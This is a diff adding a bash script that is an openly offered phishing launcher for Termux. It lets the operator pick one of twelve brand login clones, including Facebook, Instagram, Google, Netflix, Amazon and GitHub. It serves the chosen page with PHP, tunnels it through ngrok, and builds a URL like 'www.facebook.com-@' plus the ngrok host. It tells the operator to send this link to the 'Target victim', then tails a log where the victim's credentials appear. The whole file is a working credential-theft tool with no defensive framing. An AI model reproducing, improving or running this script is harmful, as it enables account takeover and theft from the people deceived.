@@ -1,0 +1,135 @@
+#!/bin/bash
+#<<<---------banner---------->>>
+__banner__() {
+cat banner | pv -qL 300 | lolcat
+echo
+}
+__banner__
+#<<<----------colour substitution by variables---------->>>
+C0="$(printf '\033[90m')"  B0="$(printf '\033[100m')"
+C1="$(printf '\033[91m')"  B1="$(printf '\033[101m')"
+C2="$(printf '\033[92m')"  B2="$(printf '\033[102m')"
+C3="$(printf '\033[93m')"  B3="$(printf '\033[103m')"
+C4="$(printf '\033[94m')"  B4="$(printf '\033[104m')"
+C5="$(printf '\033[95m')"  B5="$(printf '\033[105m')"
+C6="$(printf '\033[96m')"  B6="$(printf '\033[106m')"
+C7="$(printf '\033[97m')"  B7="$(printf '\033[107m')"
+R0="$(printf '\033[00m')"  R1="$(printf '\033[0;1m')"
+D0="$(printf '\033[77m')"
+#<<<-----------program---------->>>
+wait() {
+sleep 0.002
+}
+__programs__() {
+printf "${B1}List of phising sites${R1}\n"; wait
+echo; wait
+printf "${C2}>01. Facebook ${R0}\n"; wait
+printf "${C2}>02. Instagram ${R0}\n"; wait
+printf "${C2}>03. Google ${R0}\n"; wait
+printf "${C2}>04. WhatsApp ${R0}\n"; wait
+printf "${C2}>05. Snapchat ${R0}\n"; wait
+printf "${C2}>06. Telegram ${R0}\n"; wait
+printf "${C2}>07. HOTSTAR ${R0}\n"; wait
+printf "${C2}>08. Netflix ${R0}\n"; wait
+printf "${C2}>09. Amazon ${R0}\n"; wait
+printf "${C2}>10. Flipkart ${R0}\n"; wait
+printf "${C2}>11. GitHub ${R0}\n"; wait
+printf "${C2}>12. Twitter ${R0}\n"; wait
+printf "${C2}>Run${C1} back${C2} to go back${R0}\n"; wait
+echo; wait
+}
+__programs__
+printf "${C3}Enter your Option==> ${C2}"
+read phis
+echo
+if [[ $phis == '1' || $phis == '01' ]]; then
+pfolder='facebook'
+hoster='www.facebook.com-@'
+
+elif [[ $phis == '2' || $phis == '02' ]]; then
+pfolder='instagram'
+hoster='www.instagram.com-@'
+
+elif [[ $phis == '3' || $phis == '03' ]]; then
+pfolder='google'
+hoster='www.google.com-@'
+
+elif [[ $phis == '4' || $phis == '04' ]]; then
+pfolder='whatsapp'
+hoster='www.whatsapp.com-@'
+
+elif [[ $phis == '5' || $phis == '05' ]]; then
+pfolder='snapchat'
+hoster='www.snapchat.com-@'
+
+elif [[ $phis == '6' || $phis == '06' ]]; then
+pfolder='telegram'
+hoster='www.telegram.com-@'
+
+elif [[ $phis == '7' || $phis == '07' ]]; then
+pfolder='HOTSTAR'
+hoster='www.hotstar.com-@'
+
+elif [[ $phis == '8' || $phis == '08' ]]; then
+pfolder='Netflix'
+hoster='www.netflix.com-@'
+
+elif [[ $phis == '9' || $phis == '09' ]]; then
+pfolder='Amazon'
+hoster='www.amazon.com-@'
+
+elif [[ $phis == '10' ]]; then
+pfolder='flipkart'
+hoster='www.flipkart.com-@'
+
+elif [[ $phis == '11' ]]; then
+pfolder='github'
+hoster='www.github.com-@'
+
+elif [[ $phis == '12' ]]; then
+pfolder='twitter'
+hoster='www.twitter.com-@'
+
+elif [[ $phis == 'back' ]]; then
+exit
+
+else
+echo
+printf "${C7}[${C1}!${C7}]${C1} Please enter a valid option!!${R0}\n"
+echo
+fi
+
+cd sites/
+cd ${pfolder}/
+echo
+printf "${C2}STARTING SERVER${R0}"
+printf "${C2}..........${R0}\n" | pv -qL 10
+php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+sleep 3
+echo
+termux-chroot ./ngrok http 4444 > /dev/null 2>&1 &
+sleep 5
+echo
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+echo; wait
+printf "${C7}<<<${R0}${C1}---------------${R0}${B1}VICTIM'S CRIDENTIALS WILL BE SHOWN HERE${R1}${C1}---------------${R0}${C7}>>>${R0}\n"; wait
+echo; wait
+printf "${C4}${R0}${C4} Send this link to your Target victim :${R0}${D0} %s${R0}\n" https://${hoster}$link
+wait
+echo
+wait
+echo -e "
+		 _  _
+		/ \|_)
+		\_/| \\ short links:-
+" | pv -qL 50 | lolcat
+echo; wait
+printf "${C4}${R0}${C4} Send this link to your Target victim :${R0}${D0} %s${R0}\n" https://$link
+wait
+
+if [[ -e log.txt ]]; then
+> log.txt
+fi
+echo
+echo
+tail -f log.txt
